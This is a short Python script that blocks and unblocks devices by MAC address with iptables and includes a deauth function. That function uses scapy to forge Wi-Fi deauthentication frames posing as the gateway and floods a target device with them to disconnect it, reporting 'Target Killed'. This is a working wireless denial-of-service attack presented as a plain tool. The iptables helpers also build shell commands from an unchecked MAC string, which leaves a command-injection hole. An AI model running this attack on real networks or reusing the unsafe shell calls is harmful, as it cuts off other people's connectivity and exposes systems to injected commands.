import os
import time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
from config import NETWORK_INTERFACE, DEAUTH_COUNT, DEAUTH_INTERVAL

def block_mac(mac):
    os.system(f"iptables -A INPUT -m mac --mac-source {mac} -j DROP")
    os.system(f"iptables -A FORWARD -m mac --mac-source {mac} -j DROP")
    print(f"Blocked {mac}")

def unblock_mac(mac):
    os.system(f"iptables -D INPUT -m mac --mac-source {mac} -j DROP")
    os.system(f"iptables -D FORWARD -m mac --mac-source {mac} -j DROP")
    print(f"Unblocked {mac}")

def deauth(target_mac, gateway_mac):
    pkt = RadioTap()/Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
    sendp(pkt, iface=NETWORK_INTERFACE, count=DEAUTH_COUNT, inter=DEAUTH_INTERVAL)
    print(f"Target Killed: {target_mac} with {DEAUTH_COUNT} packets")
   